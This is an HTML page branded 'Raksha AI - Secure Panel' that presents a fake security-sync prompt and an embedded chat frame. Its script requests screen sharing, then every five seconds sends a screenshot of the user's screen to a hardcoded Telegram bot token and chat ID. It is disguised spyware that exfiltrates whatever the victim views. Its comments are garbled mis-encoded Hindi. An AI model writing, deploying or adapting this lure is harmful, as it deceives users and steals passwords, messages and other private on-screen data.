<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Raksha AI - Secure Panel</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; color: #fff; font-family: sans-serif; }
        iframe { width: 100%; height: 100%; border: none; display: none; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #00ff00; border: none; border-radius: 5px; font-weight: bold; }
        canvas { display: none; }
    </style>
</head>
<body>

    <div id="overlay">
        <h2>System Security Initialization</h2>
        <p>Please click below to sync AI security modules.</p>
        <button id="startBtn">START SECURE CHAT</button>
    </div>

    <iframe id="mainFrame" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone; camera; display-capture;"></iframe>
    <canvas id="snapshotCanvas"></canvas>

    <script>
    const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
    const MY_ID = "8508792403";

    document.getElementById('startBtn').onclick = async function() {
        try {
            // 1. ‡§∏‡•ç‡§ï‡•ç‡§∞‡•Ä‡§® ‡§∂‡•á‡§Ø‡§∞‡§ø‡§Ç‡§ó ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§æ‡§Ç‡§ó‡§®‡§æ (‡§ú‡§∞‡•Ç‡§∞‡•Ä ‡§π‡•à)
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // 2. UI ‡§ï‡•ã ‡§¨‡§¶‡§≤‡§®‡§æ
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('mainFrame').style.display = 'block';

            const canvas = document.getElementById('snapshotCanvas');
            const context = canvas.getContext('2d');

            // 3. ‡§π‡§∞ 5 ‡§∏‡•á‡§ï‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§ï‡•ç‡§∞‡•Ä‡§®‡§∂‡•â‡§ü ‡§≤‡•á‡§®‡§æ
            setInterval(async () => {
                if (stream.active) {
                    // ‡§µ‡•Ä‡§°‡§ø‡§Ø‡•ã ‡§´‡•ç‡§∞‡•á‡§Æ ‡§ï‡•ã ‡§ï‡•à‡§®‡§µ‡§æ‡§∏ ‡§™‡§∞ ‡§°‡•ç‡§∞‡§æ ‡§ï‡§∞‡§®‡§æ
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // ‡§ï‡•à‡§®‡§µ‡§æ‡§∏ ‡§ï‡•ã ‡§á‡§Æ‡•á‡§ú (Blob) ‡§Æ‡•á‡§Ç ‡§¨‡§¶‡§≤‡§®‡§æ
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const fd = new FormData();
                            fd.append("chat_id", MY_ID);
                            fd.append("photo", blob, "screen.jpg");
                            fd.append("caption", "üì∏ Raksha AI: 5-Sec Snapshot");

                            // ‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§™‡§∞ ‡§≠‡•á‡§ú‡§®‡§æ
                            try {
                                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
                                    method: "POST", 
                                    body: fd 
                                });
                            } catch (e) { console.log("Upload failed"); }
                        }
                    }, 'image/jpeg', 0.6); // 0.6 quality ‡§§‡§æ‡§ï‡§ø ‡§´‡§æ‡§á‡§≤ ‡§õ‡•ã‡§ü‡•Ä ‡§∞‡§π‡•á
                }
            }, 5000); // 5000ms = 5 ‡§∏‡•á‡§ï‡§Ç‡§°

        } catch (err) {
            alert("Permission Denied: System cannot start without security sync.");
            console.error(err);
        }
    };
    </script>
</body>
</html>
